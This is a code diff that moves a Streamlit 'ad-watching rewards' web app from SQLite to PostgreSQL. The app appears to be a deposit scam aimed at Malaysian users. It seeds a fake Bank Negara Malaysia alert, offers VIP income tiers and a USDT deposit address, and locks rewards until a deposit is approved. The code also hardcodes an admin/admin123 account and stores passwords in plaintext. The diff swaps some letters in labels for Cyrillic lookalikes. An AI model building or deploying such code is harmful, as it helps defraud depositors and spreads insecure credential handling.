@@ -1,5 +1,6 @@
 import streamlit as st
-import sqlite3
+import psycopg2
+import os
 import random
 import smtplib
 import time
@@ -52,98 +53,122 @@ MALAYSIAN_BANKS = [
     "CIMB Bank Berhad", "Public Bank Berhad", "RHB Bank Berhad", "Hong Leong Bank Berhad"
 ]
 
-# --- SECURE DATABASE INTERFACE ---
+# --- SECURE DATABASE INTERFACE (POSTGRESQL UPGRADE) ---
 def init_db():
-    conn = sqlite3.connect("matrix_vault.db", check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS users (
-            username TEXT PRIMARY KEY, password TEXT, balance REAL, liquidation REAL, active_level TEXT, ref_code TEXT, referred_by TEXT
-        )
-    """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS system_config (
-            key TEXT PRIMARY KEY, value TEXT
-        )
-    """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS deposits (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, bank TEXT, name TEXT, trx_id TEXT, amount REAL, status TEXT
-        )
-    """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS checkins (
-            username TEXT, date TEXT, PRIMARY KEY (username, date)
-        )
-    """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS ad_logs (
-            username TEXT, ad_id TEXT, date TEXT, PRIMARY KEY (username, ad_id, date)
-        )
-    """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS lucky_spins (
-            username TEXT, date TEXT, prize REAL, PRIMARY KEY (username, date)
-        )
-    """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS withdrawals (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, bank TEXT, account TEXT, amount REAL, status TEXT
-        )
-    """)
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS ad_campaigns (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, advertiser_email TEXT, video_url TEXT, target_views INTEGER, trx_id TEXT, status TEXT
-        )
-    """)
-    # Table for Support Ticket System
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS support_tickets (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, subject TEXT, message TEXT, reply TEXT, status TEXT
-        )
-    """)
+    DATABASE_URL = os.environ.get("DATABASE_URL")
+    if not DATABASE_URL:
+        return
     
+    conn = None
     try:
-        cursor.execute("ALTER TABLE users ADD COLUMN referred_by TEXT")
-    except sqlite3.OperationalError:
-        pass
+        conn = psycopg2.connect(DATABASE_URL)
+        cursor = conn.cursor()
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS users (
+                username TEXT PRIMARY KEY, password TEXT, balance REAL, liquidation REAL, active_level TEXT, ref_code TEXT, referred_by TEXT
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS system_config (
+                key TEXT PRIMARY KEY, value TEXT
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS deposits (
+                id SERIAL PRIMARY KEY, username TEXT, bank TEXT, name TEXT, trx_id TEXT, amount REAL, status TEXT
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS checkins (
+                username TEXT, date TEXT, PRIMARY KEY (username, date)
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS ad_logs (
+                username TEXT, ad_id TEXT, date TEXT, PRIMARY KEY (username, ad_id, date)
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS lucky_spins (
+                username TEXT, date TEXT, prize REAL, PRIMARY KEY (username, date)
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS withdrawals (
+                id SERIAL PRIMARY KEY, username TEXT, bank TEXT, account TEXT, amount REAL, status TEXT
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS ad_campaigns (
+                id SERIAL PRIMARY KEY, advertiser_email TEXT, video_url TEXT, target_views INTEGER, trx_id TEXT, status TEXT
+            )
+        """)
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS support_tickets (
+                id SERIAL PRIMARY KEY, username TEXT, subject TEXT, message TEXT, reply TEXT, status TEXT
+            )
+        """)
         
-    configs = [
-        ('ad1_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad1_reward', '3.00'),
-        ('ad2_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad2_reward', '2.30'),
-        ('ad3_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad3_reward', '4.50'),
-        ('ad4_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad4_reward', '1.50'),
-        ('ad5_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad5_reward', '2.00'),
-        ('tng_scanner_url', 'https://upload.wikimedia.org/wikipedia/commons/d/d0/QR_code_for_mobile_English_Wikipedia.svg'),
-        ('usdt_address', 'TYcc7p18K2YnQp87bXzNWXAsgWqR54321A'),
-        ('system_announcement', '⚠️ ALERT: Bank Negara Malaysia gateway optimization active. Instant processes via Touch n Go.'),
-        ('unclaimed_rewards_val', '15.00'),
-        ('vip1_income', '2.00'), ('vip2_income', '15.00'), ('vip3_income', '50.00'),
-        ('vip2_req', '100.00'), ('vip3_req', '300.00')
-    ]
-    for key, val in configs:
-        cursor.execute("INSERT OR IGNORE INTO system_config VALUES (?, ?)", (key, val))
-        
-    cursor.execute("INSERT OR IGNORE INTO users VALUES ('admin', 'admin123', 0.0, 0.0, 'OWNER', 'MASTER', '')")
-    conn.commit()
-    conn.close()
+        try:
+            cursor.execute("ALTER TABLE users ADD COLUMN referred_by TEXT")
+        except Exception:
+            pass
+            
+        configs = [
+            ('ad1_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad1_reward', '3.00'),
+            ('ad2_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad2_reward', '2.30'),
+            ('ad3_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad3_reward', '4.50'),
+            ('ad4_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad4_reward', '1.50'),
+            ('ad5_url', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'), ('ad5_reward', '2.00'),
+            ('tng_scanner_url', 'https://upload.wikimedia.org/wikipedia/commons/d/d0/QR_code_for_mobile_English_Wikipedia.svg'),
+            ('usdt_address', 'TYcc7p18K2YnQp87bXzNWXAsgWqR54321A'),
+            ('system_announcement', '⚠️ ALERT: Bank Negara Malaysia gateway optimization active. Instant processes via Touch n Go.'),
+            ('unclaimed_rewards_val', '15.00'),
+            ('vip1_income', '2.00'), ('vip2_income', '15.00'), ('vip3_income', '50.00'),
+            ('vip2_req', '100.00'), ('vip3_req', '300.00')
+        ]
+        for key, val in configs:
+            cursor.execute("INSERT INTO system_config VALUES (%s, %s) ON CONFLICT (key) DO NOTHING", (key, val))
+            
+        cursor.execute("INSERT INTO users VALUES ('admin', 'admin123', 0.0, 0.0, 'OWNER', 'MASTER', '') ON CONFLICT (username) DO NOTHING")
+        conn.commit()
+        cursor.close()
+        conn.close()
+    except Exception as e:
+        if conn:
+            conn.rollback()
+            conn.close()
+        print(f"Database Init Error: {e}")
 
 init_db()
 
 def query_db(query, args=(), one=False, commit=False):
-    conn = sqlite3.connect("matrix_vault.db", check_same_thread=False)
-    cursor = conn.cursor()
+    DATABASE_URL = os.environ.get("DATABASE_URL")
+    if not DATABASE_URL:
+        st.error("⚠️ DATABASE_URL environment variable is missing inside Render settings!")
+        return None if one else []
+    
+    # Auto-translates SQLite syntax configurations dynamically to PostgreSQL native patterns
+    query = query.replace("?", "%s")
+    query = query.replace("ABS(RANDOM()%10000)", "floor(random()*10000)::int")
+    
+    conn = None
     try:
+        conn = psycopg2.connect(DATABASE_URL)
+        cursor = conn.cursor()
         cursor.execute(query, args)
         if commit:
             conn.commit()
+            cursor.close()
             conn.close()
             return True
         rv = cursor.fetchall()
+        cursor.close()
         conn.close()
         return (rv[0] if rv else None) if one else rv
     except Exception as e:
-        conn.close()
+        if conn:
+            conn.close()
         st.error(f"🛡️ Database Operational Error: {e}")
         return None if one else []
 
@@ -589,7 +614,7 @@ else:
         <div class="metric-card-box">
             <p style="font-family:'Orbitron', sans-serif; font-size:12px; color:#ff0055; margin:0; font-weight:900; letter-spacing:1px;">𝘾𝙐𝙍𝙍𝙀🇳🇹 𝙒𝘼𝙇𝙇🇪🇹 𝘽𝘼𝙇𝘼🇳𝘾𝙀</p>
             <h1 style="font-family:'Orbitron', sans-serif; font-size:38px; font-weight:900; color:#ffffff; margin:8px 0; letter-spacing:1px;">RM {wallet_bal:,.2f}</h1>
-            <p style="font-family:'Rajdhani', sans-serif; font-size:14px; color:#00f0ff; margin:0; font-weight:800; letter-spacing:0.5px;">Cᵤᵣᵣₑₙₜ ᵣₐₙₖ: {level_tag} &nbsp;|&nbsp; Ref Code: {reference_hash}</p>
+            <p style="font-family:'Rajdhani', sans-serif; font-size:14px; color:#00f0ff; margin:0; font-weight:800; letter-spacing:0.5px;">Cᵣᵣₑₙₜ ᵣₐₙₖ: {level_tag} &nbsp;|&nbsp; Ref Code: {reference_hash}</p>
         </div>
         """, unsafe_allow_html=True)
 
@@ -645,7 +670,7 @@ else:
             st.markdown("<hr style='border-color:#ff0055; opacity:0.2; margin:15px 0;'>", unsafe_allow_html=True)
             already_checked = query_db("SELECT username FROM checkins WHERE username=? AND date=?", (st.session_state.current_user, today_date), one=True)
             
-            st.markdown("<p style='font-family:\"Orbitron\"; font-weight:900; font-size:13px; color:#ff0055;'>🎁 👑 𝗙𝗿𝗲𝗲 𝗿𝗲𝘄𝗮𝗿𝗱𝘀 CHECK-IN</p>", unsafe_allow_html=True)
+            st.markdown("<p style='font-family:\"Orbitron\"; font-weight:900; font-size:13px; color:#ff0055;'>🎁 👑 𝗙𝗿𝗲е 𝗿е𝘄𝗮𝗿𝗱𝘀 CHECK-IN</p>", unsafe_allow_html=True)
             if not has_approved_deposit:
                 st.markdown("<div style='color:#ff0055; font-weight:bold; font-size:14px; margin-left:5px; border:1px solid #ff0055; padding:8px; border-radius:8px; text-align:center;'>🔒 LOCKED: First deposit must be approved by admin to activate check-in.</div>", unsafe_allow_html=True)
             else:
@@ -673,7 +698,7 @@ else:
                     ad_rew = float(query_db(f"SELECT value FROM system_config WHERE key='ad{i}_reward'", one=True)[0])
                     box_style = "custom-matrix-box-cyan" if i % 2 != 0 else "custom-matrix-box-pink"
                     
-                    st.markdown(f"<div class='{box_style}' style='text-align:center;'><div class='font-premium-title'>𝗔𝗱 𝗦𝗲𝗴𝗺𝗲𝗻𝘁 𝗕𝗹𝗼𝗰𝗸 {i}</div><div class='font-premium-value' style='margin-top:4px;'>Watch Reward: <b>RM {ad_rew:.2f}</b></div></div>", unsafe_allow_html=True)
+                    st.markdown(f"<div class='{box_style}' style='text-align:center;'><div class='font-premium-title'>𝗔𝗱 𝗦𝗲𝗴𝗺е𝗻𝘁 𝗕𝗹𝗼𝗰𝗸 {i}</div><div class='font-premium-value' style='margin-top:4px;'>Watch Reward: <b>RM {ad_rew:.2f}</b></div></div>", unsafe_allow_html=True)
                     
                     ad_watched = query_db("SELECT username FROM ad_logs WHERE username=? AND ad_id=? AND date=?", (st.session_state.current_user, f'ad{i}', today_date), one=True)
                     if ad_watched: st.markdown("<p style='color:#00f0ff; font-family:\"Orbitron\"; font-size:12px; font-weight:900; text-align:center;'>✅ COMPLETED TODAY</p>", unsafe_allow_html=True)
@@ -695,6 +720,7 @@ else:
                                 st.rerun()
 
         elif st.session_state.selected_panel == "Deposit":
+            st.markdown("<div style='margin-top:10px;'></div>", unsafe_allow_html=True)
             st.markdown("<h5 style='font-family:\"Orbitron\"; color:#00f0ff;'>SECURE DISPATCH NODE</h5>", unsafe_allow_html=True)
             chosen_bank = st.selectbox("SELECT ROUTING NODE NETWORK:", MALAYSIAN_BANKS)
             
